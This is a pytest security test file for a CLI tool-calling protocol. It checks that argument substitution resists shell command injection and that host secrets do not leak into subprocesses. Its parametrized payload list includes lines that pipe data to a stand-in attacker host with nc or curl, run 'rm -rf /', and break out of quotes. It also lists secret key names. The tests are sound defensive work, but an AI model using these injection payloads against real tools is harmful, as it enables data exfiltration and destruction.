"""Security tests for the CLI communication protocol.

Pin the fixes for:

- GHSA-33p6-5jxp-p3x4 (CWE-78, command injection via unsanitized
  ``tool_args`` interpolation in ``_substitute_utcp_args``).
- GHSA-5v57-8rxj-3p2r (CWE-526, full host environment leaked to the
  CLI subprocess via ``_prepare_environment``).

As of utcp-cli 1.1.3, substitution is context-aware: it tracks the
surrounding quote state in the template and emits a shell variable
reference (``$VAR`` / ``${VAR}`` / ``$env:VAR``) for each placeholder,
then carries the actual values to the subprocess via env vars. The
shell expands them at runtime, AFTER parsing, so attacker-controlled
bytes never enter the parser. Each invocation uses a fresh nonce so a
template author cannot collide with the injection slot.
"""
import os
import re
import sys
import tempfile

import pytest
import pytest_asyncio

from utcp_cli.cli_communication_protocol import CliCommunicationProtocol
from utcp_cli.cli_call_template import CliCallTemplate, CliCallTemplateSerializer


NONCE = "TESTNONCE"


def _v(name: str) -> str:
    return f"__UTCP_ARG_{NONCE}_{name}"


@pytest_asyncio.fixture
async def transport() -> CliCommunicationProtocol:
    yield CliCommunicationProtocol()


# ---------------------------------------------------------------------------
# Argument substitution must:
#   1. NOT splice attacker-controlled bytes into the parsed script.
#   2. Emit a reference whose form matches the surrounding quote context.
#   3. Carry the raw value via the returned env contribution.
# ---------------------------------------------------------------------------

class TestSubstitutionContextAwareEmission:
    @pytest.mark.skipif(os.name == "nt", reason="bash semantics")
    def test_bash_bare_emits_quoted_var(self, transport):
        cmd, env = transport._substitute_utcp_args(
            "mytool UTCP_ARG_x_UTCP_END", {"x": "a b"}, NONCE
        )
        assert cmd == f'mytool "${_v("x")}"'
        assert env[_v("x")] == "a b"

    @pytest.mark.skipif(os.name == "nt", reason="bash semantics")
    def test_bash_dq_emits_braced_var(self, transport):
        cmd, env = transport._substitute_utcp_args(
            'echo "Hi UTCP_ARG_x_UTCP_END!"', {"x": "a; rm /"}, NONCE
        )
        assert cmd == f'echo "Hi ${{{_v("x")}}}!"'
        assert env[_v("x")] == "a; rm /"

    @pytest.mark.skipif(os.name == "nt", reason="bash semantics")
    def test_bash_sq_emits_breakout_concat(self, transport):
        cmd, env = transport._substitute_utcp_args(
            "echo 'Hi UTCP_ARG_x_UTCP_END!'", {"x": "a; rm /"}, NONCE
        )
        # Bash adjacent-quote concat: 'Hi '"$VAR"'!' -> single token.
        assert cmd == f"""echo 'Hi '"${_v("x")}"'!'"""
        assert env[_v("x")] == "a; rm /"

    @pytest.mark.skipif(os.name == "nt", reason="bash semantics")
    def test_bash_escaped_dq_does_not_flip_state(self, transport):
        # `echo "esc\" UTCP_ARG_a_UTCP_END"` -- the \" is escaped so dq
        # remains open, placeholder must emit ${VAR}.
        cmd, _ = transport._substitute_utcp_args(
            'echo "esc\\" UTCP_ARG_a_UTCP_END"', {"a": "v"}, NONCE
        )
        assert cmd == f'echo "esc\\" ${{{_v("a")}}}"'

    @pytest.mark.skipif(os.name != "nt", reason="PowerShell semantics")
    def test_ps_bare_emits_braced_env_var(self, transport):
        cmd, env = transport._substitute_utcp_args(
            "mytool UTCP_ARG_x_UTCP_END", {"x": "a b"}, NONCE
        )
        # Braced form so suffix chars cannot be consumed into the var
        # name boundary.
        assert cmd == "mytool ${env:" + _v("x") + "}"
        assert env[_v("x")] == "a b"

    @pytest.mark.skipif(os.name != "nt", reason="PowerShell semantics")
    def test_ps_dq_emits_braced_env_var(self, transport):
        cmd, env = transport._substitute_utcp_args(
            'Write-Output "Hi UTCP_ARG_x_UTCP_END!"', {"x": "a; rm /"}, NONCE
        )
        assert cmd == 'Write-Output "Hi ${env:' + _v("x") + '}!"'
        assert env[_v("x")] == "a; rm /"

    @pytest.mark.skipif(os.name != "nt", reason="PowerShell semantics")
    def test_ps_alphanumeric_suffix_does_not_extend_var_name(self, transport):
        # Regression: with the bare `$env:VAR` form, an alphanumeric or
        # underscore suffix in the template would be parsed as part of
        # the env var name. The braced form `${env:VAR}` closes the
        # boundary cleanly so the template suffix stays literal.
        cmd, env = transport._substitute_utcp_args(
            'Write-Output "URL=UTCP_ARG_id_UTCP_END123suffix"',
            {"id": "abc"},
            NONCE,
        )
        assert cmd == (
            'Write-Output "URL=${env:' + _v("id") + '}123suffix"'
        )
        assert env[_v("id")] == "abc"

    @pytest.mark.skipif(os.name != "nt", reason="PowerShell semantics")
    def test_ps_sq_raises_with_clear_message(self, transport):
        with pytest.raises(ValueError, match="single-quoted"):
            transport._substitute_utcp_args(
                "Write-Output 'Hi UTCP_ARG_x_UTCP_END'", {"x": "a"}, NONCE
            )

    @pytest.mark.skipif(os.name != "nt", reason="PowerShell semantics")
    def test_ps_backtick_in_dq_preserved(self, transport):
        cmd, _ = transport._substitute_utcp_args(
            'Write-Output "pre `"x`" UTCP_ARG_a_UTCP_END"', {"a": "v"}, NONCE
        )
        # dq state must still be active when placeholder is hit.
        assert cmd == 'Write-Output "pre `"x`" ${env:' + _v("a") + '}"'

    def test_multiple_placeholders_share_namespace(self, transport):
        cmd, env = transport._substitute_utcp_args(
            "cmd UTCP_ARG_a_UTCP_END UTCP_ARG_b_UTCP_END",
            {"a": "1", "b": "2"},
            NONCE,
        )
        assert env[_v("a")] == "1"
        assert env[_v("b")] == "2"
        assert not re.search(r"UTCP_ARG_[a-zA-Z0-9_]+_UTCP_END", cmd)

    def test_multiple_placeholders_in_same_dq_compose(self, transport):
        # The doc-claimed pattern: several placeholders within the same
        # quoted region should compose into one argument with the
        # surrounding literals.
        cmd, env = transport._substitute_utcp_args(
            'curl "https://api/UTCP_ARG_id_UTCP_END/UTCP_ARG_action_UTCP_END"',
            {"id": "abc", "action": "del"},
            NONCE,
        )
        if os.name == "nt":
            assert cmd == (
                'curl "https://api/${env:' + _v("id")
                + '}/${env:' + _v("action") + '}"'
            )
        else:
            assert (
                cmd
                == f'curl "https://api/${{{_v("id")}}}/${{{_v("action")}}}"'
            )

    def test_missing_arg_recorded_via_env(self, transport):
        cmd, env = transport._substitute_utcp_args(
            "cmd UTCP_ARG_x_UTCP_END", {}, NONCE
        )
        assert env[_v("x")] == "MISSING_ARG_x"
        assert "UTCP_ARG_x_UTCP_END" not in cmd

    @pytest.mark.parametrize(
        "payload",
        [
            'data.csv; curl http://attacker.example',
            'data.csv && rm -rf /',
            'data.csv | nc attacker.example 9999',
            'data.csv `id`',
            'data.csv $(id)',
            'data.csv"; echo pwned; "',
            'value with spaces',
            "value'with'quote",
            '"; rm -rf /; "',
        ],
    )
    def test_attacker_bytes_never_appear_in_substituted_command(
        self, transport, payload
    ):
        # Headline guarantee: SCRIPT contains only our reference + the
        # template literal chars. Attacker bytes go into env.
        if os.name == "nt":
            templates = [
                "Write-Output UTCP_ARG_id_UTCP_END",
                'Write-Output "URL=UTCP_ARG_id_UTCP_END"',
            ]
        else:
            templates = [
                "curl UTCP_ARG_id_UTCP_END",
                'curl "https://api/UTCP_ARG_id_UTCP_END"',
                "curl 'https://api/UTCP_ARG_id_UTCP_END'",
            ]
        for tpl in templates:
            cmd, env = transport._substitute_utcp_args(
                tpl, {"id": payload}, NONCE
            )
            # No raw payload metacharacters should appear in cmd. We
            # check for `;` which is the canonical injection marker.
            assert ";" not in cmd, (
                f"payload bytes leaked into substituted command for "
                f"template {tpl!r}: cmd={cmd!r}"
            )
            # And the value must round-trip through env.
            assert env[_v("id")] == payload

    def test_nonce_changes_between_invocations(self, transport):
        # Drive the public path twice; scripts must use different
        # env-var names each run.
        from utcp_cli.cli_call_template import CommandStep

        commands = [CommandStep(command="echo UTCP_ARG_x_UTCP_END")]
        a_script, a_env = transport._build_combined_shell_script(
            commands, {"x": "v"}
        )
        b_script, b_env = transport._build_combined_shell_script(
            commands, {"x": "v"}
        )
        assert next(iter(a_env.keys())) != next(iter(b_env.keys()))


# ---------------------------------------------------------------------------
# _prepare_environment must NOT leak the full host environment.
# ---------------------------------------------------------------------------

class TestPreparedEnvironmentDoesNotLeakSecrets:
    SECRET_KEYS = [
        "OPENAI_API_KEY",
        "ANTHROPIC_API_KEY",
        "AWS_SECRET_ACCESS_KEY",
        "AWS_ACCESS_KEY_ID",
        "AZURE_CLIENT_SECRET",
        "GITHUB_TOKEN",
        "DATABASE_URL",
        "SLACK_TOKEN",
    ]

    def test_secrets_in_host_env_do_not_propagate(self, transport, monkeypatch):
        for k in self.SECRET_KEYS:
            monkeypatch.setenv(k, f"super-secret-{k}")
        provider = CliCallTemplate(commands=[{"command": "echo hi"}])
        env = transport._prepare_environment(provider)
        for k in self.SECRET_KEYS:
            assert k not in env, (
                f"{k} leaked from host environment into CLI subprocess "
                "(GHSA-5v57-8rxj-3p2r). Only the safe-keys allowlist plus "
                "provider.env_vars / inherit_env_vars should propagate."
            )

    def test_explicit_env_vars_are_preserved(self, transport, monkeypatch):
        monkeypatch.setenv("OPENAI_API_KEY", "host-value")
        provider = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            env_vars={"OPENAI_API_KEY": "explicit-value", "MY_FLAG": "1"},
        )
        env = transport._prepare_environment(provider)
        assert env["OPENAI_API_KEY"] == "explicit-value"
        assert env["MY_FLAG"] == "1"

    def test_essentials_are_preserved(self, transport, monkeypatch):
        monkeypatch.setenv("PATH", "/usr/local/bin:/usr/bin:/bin")
        provider = CliCallTemplate(commands=[{"command": "echo hi"}])
        env = transport._prepare_environment(provider)
        assert "PATH" in env

    def test_env_vars_override_safe_defaults(self, transport, monkeypatch):
        monkeypatch.setenv("PATH", "/usr/bin")
        provider = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            env_vars={"PATH": "/custom/bin"},
        )
        env = transport._prepare_environment(provider)
        assert env["PATH"] == "/custom/bin"

    def test_inherit_env_vars_passes_named_host_secrets(self, transport, monkeypatch):
        monkeypatch.setenv("OPENAI_API_KEY", "sk-from-host")
        monkeypatch.setenv("AWS_PROFILE", "prod")
        monkeypatch.setenv("DATABASE_URL", "postgres://...")

        provider = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            inherit_env_vars=["OPENAI_API_KEY", "AWS_PROFILE"],
        )
        env = transport._prepare_environment(provider)
        assert env["OPENAI_API_KEY"] == "sk-from-host"
        assert env["AWS_PROFILE"] == "prod"
        assert "DATABASE_URL" not in env

    def test_inherit_env_vars_skips_unset(self, transport, monkeypatch):
        monkeypatch.delenv("THIS_DOES_NOT_EXIST", raising=False)
        provider = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            inherit_env_vars=["THIS_DOES_NOT_EXIST"],
        )
        env = transport._prepare_environment(provider)
        assert "THIS_DOES_NOT_EXIST" not in env

    def test_env_vars_override_inherit_env_vars(self, transport, monkeypatch):
        monkeypatch.setenv("OPENAI_API_KEY", "host-value")
        provider = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            inherit_env_vars=["OPENAI_API_KEY"],
            env_vars={"OPENAI_API_KEY": "explicit-override"},
        )
        env = transport._prepare_environment(provider)
        assert env["OPENAI_API_KEY"] == "explicit-override"

    def test_inherit_env_vars_empty_list_is_strict_mode(self, transport, monkeypatch):
        monkeypatch.setenv("PATH", "/usr/bin")
        monkeypatch.setenv("HOME", "/home/x")
        monkeypatch.setenv("OPENAI_API_KEY", "secret")

        provider = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            inherit_env_vars=[],
        )
        env = transport._prepare_environment(provider)
        assert env == {}

    def test_inherit_env_vars_empty_list_with_env_vars(self, transport, monkeypatch):
        monkeypatch.setenv("PATH", "/usr/bin")
        provider = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            inherit_env_vars=[],
            env_vars={"FOO": "bar"},
        )
        env = transport._prepare_environment(provider)
        assert env == {"FOO": "bar"}

    def test_inherit_env_vars_list_replaces_default_allowlist(
        self, transport, monkeypatch
    ):
        monkeypatch.setenv("PATH", "/usr/bin")
        monkeypatch.setenv("HOME", "/home/x")
        monkeypatch.setenv("OPENAI_API_KEY", "secret")

        provider = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            inherit_env_vars=["OPENAI_API_KEY"],
        )
        env = transport._prepare_environment(provider)
        assert env == {"OPENAI_API_KEY": "secret"}

    def test_default_inherit_env_vars_includes_path_and_home(
        self, transport, monkeypatch
    ):
        monkeypatch.setenv("PATH", "/usr/bin")
        if os.name == "nt":
            monkeypatch.setenv("USERPROFILE", "C:\\Users\\x")
            home_key = "USERPROFILE"
        else:
            monkeypatch.setenv("HOME", "/home/x")
            home_key = "HOME"

        provider = CliCallTemplate(commands=[{"command": "echo hi"}])
        env = transport._prepare_environment(provider)
        assert env["PATH"] == "/usr/bin"
        assert home_key in env

    def test_explicit_none_matches_default(self, transport, monkeypatch):
        monkeypatch.setenv("PATH", "/usr/bin")
        monkeypatch.setenv("OPENAI_API_KEY", "secret")

        omitted = CliCallTemplate(commands=[{"command": "echo hi"}])
        explicit_none = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            inherit_env_vars=None,
        )
        assert (
            transport._prepare_environment(omitted)
            == transport._prepare_environment(explicit_none)
        )

    def test_list_replaces_default_does_not_pull_in_other_defaults(
        self, transport, monkeypatch
    ):
        monkeypatch.setenv("PATH", "/usr/bin")
        monkeypatch.setenv("HOME", "/home/x")
        monkeypatch.setenv("USERPROFILE", "C:\\Users\\x")
        monkeypatch.setenv("LANG", "en_US.UTF-8")

        provider = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            inherit_env_vars=["PATH"],
        )
        env = transport._prepare_environment(provider)
        assert env == {"PATH": "/usr/bin"}

    def test_duplicate_names_in_inherit_env_vars_are_idempotent(
        self, transport, monkeypatch
    ):
        monkeypatch.setenv("FOO", "1")
        provider = CliCallTemplate(
            commands=[{"command": "echo hi"}],
            inherit_env_vars=["FOO", "FOO", "FOO"],
        )
        env = transport._prepare_environment(provider)
        assert env == {"FOO": "1"}

    def test_unset_names_in_default_allowlist_are_skipped(
        self, transport, monkeypatch
    ):
        for key in transport._default_inherited_keys():
            monkeypatch.delenv(key, raising=False)
        monkeypatch.setenv("PATH", "/usr/bin")

        provider = CliCallTemplate(commands=[{"command": "echo hi"}])
        env = transport._prepare_environment(provider)
        assert env == {"PATH": "/usr/bin"}
        for v in env.values():
            assert v is not None
            assert isinstance(v, str)


class TestInheritEnvVarsSerialization:
    def test_round_trip_preserves_none(self):
        tpl = CliCallTemplate(commands=[{"command": "x"}])
        d = CliCallTemplateSerializer().to_dict(tpl)
        assert d.get("inherit_env_vars", None) is None
        rebuilt = CliCallTemplateSerializer().validate_dict(d)
        assert rebuilt.inherit_env_vars is None

    def test_round_trip_preserves_empty_list(self):
        tpl = CliCallTemplate(
            commands=[{"command": "x"}], inherit_env_vars=[]
        )
        d = CliCallTemplateSerializer().to_dict(tpl)
        assert d["inherit_env_vars"] == []
        rebuilt = CliCallTemplateSerializer().validate_dict(d)
        assert rebuilt.inherit_env_vars == []

    def test_round_trip_preserves_listed_names(self):
        tpl = CliCallTemplate(
            commands=[{"command": "x"}],
            inherit_env_vars=["PATH", "OPENAI_API_KEY"],
        )
        d = CliCallTemplateSerializer().to_dict(tpl)
        assert d["inherit_env_vars"] == ["PATH", "OPENAI_API_KEY"]
        rebuilt = CliCallTemplateSerializer().validate_dict(d)
        assert rebuilt.inherit_env_vars == ["PATH", "OPENAI_API_KEY"]


# ---------------------------------------------------------------------------
# End-to-end (Unix only -- bash payload assumptions). Lock down the
# regression where a placeholder INSIDE surrounding double quotes
# allowed injection in the inline-shlex.quote 1.1.2 strategy.
# ---------------------------------------------------------------------------

@pytest.mark.skipif(os.name == "nt", reason="bash payload assumptions")
@pytest.mark.asyncio
async def test_no_command_injection_bare_unix(tmp_path):
    transport = CliCommunicationProtocol()
    canary = tmp_path / "pwned-bare"
    script = tmp_path / "echo_arg.py"
    script.write_text(
        "import sys\nprint('arg:' + sys.argv[1])\n"
    )
    call_template = CliCallTemplate(
        commands=[
            {"command": f"{sys.executable} {script} UTCP_ARG_value_UTCP_END"}
        ]
    )
    payload = f"benign; touch {canary}"
    result = await transport.call_tool(
        None, "echo_arg", {"value": payload}, call_template
    )
    assert not canary.exists(), "Command injection regression (GHSA-33p6-5jxp-p3x4)"
    assert "benign; touch" in str(result)


@pytest.mark.skipif(os.name == "nt", reason="bash payload assumptions")
@pytest.mark.asyncio
async def test_no_command_injection_dq_unix(tmp_path):
    """The exact bypass scenario the inline shlex.quote in 1.1.2 missed:
    placeholder inside surrounding double quotes with a value crafted
    to close the dq early."""
    transport = CliCommunicationProtocol()
    canary = tmp_path / "pwned-dq"
    call_template = CliCallTemplate(
        commands=[
            {"command": 'echo "URL=UTCP_ARG_id_UTCP_END"'}
        ],
        working_dir=str(tmp_path),
    )
    payload = f'"; touch {canary}; "'
    result = await transport.call_tool(
        None, "echo_url", {"id": payload}, call_template
    )
    assert not canary.exists(), (
        "Double-quote-context command injection regression "
        "(GHSA-33p6-5jxp-p3x4 follow-up). The shlex.quote-in-dq bypass "
        "must stay closed."
    )
    assert "URL=" in str(result)
    assert "touch" in str(result)


@pytest.mark.skipif(os.name == "nt", reason="bash payload assumptions")
@pytest.mark.asyncio
async def test_no_command_injection_sq_unix(tmp_path):
    transport = CliCommunicationProtocol()
    canary = tmp_path / "pwned-sq"
    call_template = CliCallTemplate(
        commands=[
            {"command": "echo 'URL=UTCP_ARG_id_UTCP_END end'"}
        ],
        working_dir=str(tmp_path),
    )
    payload = f"'; touch {canary}; '"
    result = await transport.call_tool(
        None, "echo_url", {"id": payload}, call_template
    )
    assert not canary.exists()
    assert "URL=" in str(result)


@pytest.mark.skipif(os.name == "nt", reason="bash payload assumptions")
@pytest.mark.asyncio
async def test_host_secret_not_inherited_unix(monkeypatch):
    """Host secret not in inherit_env_vars must not reach subprocess."""
    monkeypatch.setenv("UTCP_TEST_LEAK_PROBE", "should-not-leak")
    transport = CliCommunicationProtocol()
    call_template = CliCallTemplate(
        commands=[
            {"command": 'echo "probe=${UTCP_TEST_LEAK_PROBE:-MISSING}"'}
        ],
    )
    result = await transport.call_tool(
        None, "leak_probe", {}, call_template
    )
    assert "probe=MISSING" in str(result)
    assert "should-not-leak" not in str(result)


@pytest.mark.skipif(os.name == "nt", reason="bash payload assumptions")
@pytest.mark.asyncio
async def test_inherit_env_vars_opts_in_unix(monkeypatch):
    monkeypatch.setenv("UTCP_TEST_LEAK_PROBE", "inherited-value")
    transport = CliCommunicationProtocol()
    call_template = CliCallTemplate(
        commands=[
            {"command": 'echo "probe=${UTCP_TEST_LEAK_PROBE:-MISSING}"'}
        ],
        inherit_env_vars=["PATH", "UTCP_TEST_LEAK_PROBE"],
    )
    result = await transport.call_tool(
        None, "leak_probe", {}, call_template
    )
    assert "probe=inherited-value" in str(result)
